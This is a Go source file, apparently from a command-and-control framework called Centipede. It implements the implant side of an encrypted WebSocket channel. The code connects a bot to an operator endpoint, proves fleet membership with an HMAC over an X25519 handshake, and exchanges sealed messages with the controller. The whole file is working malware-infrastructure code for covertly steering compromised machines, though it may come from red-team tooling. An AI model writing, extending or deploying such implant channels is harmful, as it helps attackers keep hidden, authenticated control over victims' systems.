package c2

import (
	"crypto/subtle"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"sync"
	"time"

	"github.com/gorilla/websocket"

	"github.com/saviorSEC/Centipede/internal/common"
)

type WebSocketLayer struct {
	botID     string
	endpoint  string
	conn      *websocket.Conn
	mu        sync.Mutex
	connected bool
	done      chan struct{}
	recvCh    chan *Message

	serverKey []byte // server static X25519 public key (encryption mode)
	authKey   []byte // operator secret for implant authentication
	crypto    *common.ChannelCrypto
}

func NewWebSocketLayer(botID, endpoint string) *WebSocketLayer {
	return &WebSocketLayer{
		botID:    botID,
		endpoint: endpoint,
		done:     make(chan struct{}),
		recvCh:   make(chan *Message, 64),
	}
}

// SetServerKey enables E2E encryption: serverKey is the c2d static X25519
// public key (hex). authKey, when set, is used to prove fleet membership in
// the handshake.
func (w *WebSocketLayer) SetServerKey(serverKey, authKey []byte) {
	w.serverKey = serverKey
	w.authKey = authKey
}

func (w *WebSocketLayer) Name() string { return "websocket" }

func (w *WebSocketLayer) Connect() error {
	w.mu.Lock()
	defer w.mu.Unlock()

	dialer := websocket.Dialer{HandshakeTimeout: 10 * time.Second}
	conn, _, err := dialer.Dial(w.endpoint, nil)
	if err != nil {
		return fmt.Errorf("ws dial: %w", err)
	}

	w.conn = conn
	w.connected = true
	w.done = make(chan struct{})

	if w.serverKey != nil {
		if err := w.handshake(conn); err != nil {
			conn.Close()
			w.connected = false
			return fmt.Errorf("ws handshake: %w", err)
		}
	}

	go w.readLoop()
	return nil
}

// handshake exchanges the ephemeral key with the server and authenticates it
// via the AEAD-sealed ack (and this implant via the HMAC auth tag).
func (w *WebSocketLayer) handshake(conn *websocket.Conn) error {
	eph, err := common.GenerateECDHKey()
	if err != nil {
		return err
	}
	ephPub := eph.PublicKey().Bytes()
	ch := common.RandomString(16)

	hello := map[string]interface{}{
		"t":   "hello",
		"bid": w.botID,
		"k":   hex.EncodeToString(ephPub),
		"ch":  ch,
	}
	if w.authKey != nil {
		hello["tag"] = hex.EncodeToString(common.HMAC(append(append([]byte{}, ephPub...), []byte(ch)...), w.authKey))
	}
	if err := conn.WriteJSON(hello); err != nil {
		return err
	}

	// receive + decrypt the ack to authenticate the server
	_ = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	defer conn.SetReadDeadline(time.Time{})
	_, data, err := conn.ReadMessage()
	if err != nil {
		return err
	}
	shared, err := common.ECDHShared(eph, w.serverKey)
	if err != nil {
		return err
	}
	cc := common.DeriveChannel(shared, ephPub, w.serverKey, nil)
	pt, err := cc.Open(false, data)
	if err != nil {
		return fmt.Errorf("server ack verify failed (wrong server key?)")
	}
	var ack map[string]interface{}
	if err := json.Unmarshal(pt, &ack); err != nil {
		return err
	}
	if ackT, _ := ack["t"].(string); ackT != "ack" {
		return fmt.Errorf("expected ack")
	}
	if ackCh, _ := ack["ch"].(string); subtle.ConstantTimeCompare([]byte(ackCh), []byte(ch)) != 1 {
		return fmt.Errorf("ack challenge mismatch")
	}
	w.crypto = cc
	return nil
}

func (w *WebSocketLayer) Send(msg *Message) error {
	w.mu.Lock()
	defer w.mu.Unlock()
	if !w.connected || w.conn == nil {
		return fmt.Errorf("not connected")
	}
	data, err := json.Marshal(msg)
	if err != nil {
		return err
	}
	if w.crypto != nil {
		sealed, err := w.crypto.Seal(true, data)
		if err != nil {
			return err
		}
		return w.conn.WriteMessage(websocket.TextMessage, sealed)
	}
	return w.conn.WriteMessage(websocket.TextMessage, data)
}

func (w *WebSocketLayer) Receive() (*Message, error) {
	select {
	case msg := <-w.recvCh:
		return msg, nil
	case <-time.After(30 * time.Second):
		return nil, fmt.Errorf("timeout")
	}
}

func (w *WebSocketLayer) Close() error {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.connected = false
	close(w.done)
	if w.conn != nil {
		return w.conn.Close()
	}
	return nil
}

func (w *WebSocketLayer) IsConnected() bool {
	w.mu.Lock()
	defer w.mu.Unlock()
	return w.connected
}

func (w *WebSocketLayer) readLoop() {
	for {
		select {
		case <-w.done:
			return
		default:
		}

		_, data, err := w.conn.ReadMessage()
		if err != nil {
			w.mu.Lock()
			w.connected = false
			w.mu.Unlock()
			return
		}

		if w.crypto != nil {
			pt, err := w.crypto.Open(false, data)
			if err != nil {
				continue
			}
			data = pt
		}

		var msg Message
		if json.Unmarshal(data, &msg) != nil {
			continue
		}

		select {
		case w.recvCh <- &msg:
		default:
		}
	}
}
